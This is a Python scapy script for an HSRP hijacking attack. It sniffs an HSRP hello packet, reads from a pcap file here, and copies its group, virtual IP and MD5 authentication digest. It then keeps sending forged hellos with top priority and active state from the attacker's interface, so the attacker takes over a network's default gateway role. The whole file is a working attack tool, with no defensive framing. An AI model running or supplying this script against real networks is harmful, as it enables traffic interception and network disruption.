from scapy.all import *
import netifaces as ni

destIP = ""
virtIP = ""
virtualMAC = ""
destMAC = ""
source = None
dest = None
grp = None
ver = None
op = None
st = None
payloadHSRP = None

#change when required
nic="wlan0"
attackerIP = ni.ifaddresses(nic)[ni.AF_INET][0]['addr']

def scan_hsrp():
	print("Listening for HSRP packets...")
	#change based on group number, AC:XX for v1 and FX:XX for v2
	pkt = sniff(filter="ether src 00:00:0C:07:AC:01 or ether src 00:00:0C:9F:F0:01", count=1, offline="hsrp v2.pcap")
	return pkt[0]

def getHSRPInfo():
	global destIP, virtIP, virtualMAC, destMAC, source, dest, grp, ver, op, st, payloadHSRP
	pkt = scan_hsrp()
	if (pkt['HSRP'].version == 0):
		print("HSRP version 1 detected!")
		virtualMAC = pkt['Ethernet'].src
		destMAC = pkt['Ethernet'].dst
		destIP = pkt['IP'].dst
		source = pkt['UDP'].sport
		dest = pkt['UDP'].dport
		virtIP = pkt['HSRP'].virtualIP
		grp = pkt['HSRP'].group
		op = pkt['HSRP'].opcode
		st = pkt['HSRP'].state
		ver = pkt['HSRP'].version
	else:
		print("HSRP version 2 detected!")
		virtualMAC = pkt['Ethernet'].src
		destMAC = pkt['Ethernet'].dst
		destIP = pkt['IP'].dst
		source = pkt['UDP'].sport
		dest = pkt['UDP'].dport
		id = pkt['HSRP'].auth
		grp = pkt['HSRP'].reserved
		virtIP = pkt['HSRP MD5 Authentication'].sourceip
		auth = pkt['HSRP MD5 Authentication'].authdigest
		hellotime = 3000
		holdtime = 10000
		op = 0
		st = 6
		ver = 2
		priority = 255
		payloadHSRP = ver.to_bytes(1,'big') + op.to_bytes(1,'big') + st.to_bytes(1, 'big') + b'\x04' + grp.to_bytes(2,'big') + id + priority.to_bytes(2,'big') + hellotime.to_bytes(4,'big') + holdtime.to_bytes(4,'big') + bytes(map(int, virtIP.split('.'))) + bytes(4) + auth + bytes(2)
		pkt.show()
		print(payloadHSRP)   

def send_packetvr1():
	eth = Ether(src=virtualMAC, dst=destMAC)
	ip = IP(src=attackerIP, dst=destIP)
	udp = UDP(sport=source, dport=dest)
	hsrp = HSRP(group=grp, priority=255, virtualIP=virtIP, opcode=op, state=st)
	sendp(eth/ip/udp/hsrp, iface=nic, inter=3, loop=1)

def send_packetvr2():
	eth = Ether(src=virtualMAC, dst=destMAC)
	ip = IP(src=attackerIP, dst=destIP, len=80)
	udp = UDP(sport=source, dport=dest, len=60)
	hsrp = IPv6ExtHdrSegmentRoutingTLV(type=1, len=40, value=payloadHSRP)
	sendp(eth/ip/udp/hsrp, iface=nic, inter=3, loop=1)

if __name__ == "__main__":
	getHSRPInfo()
	if(ver == 0):
		send_packetvr1()
	else:
		send_packetvr2()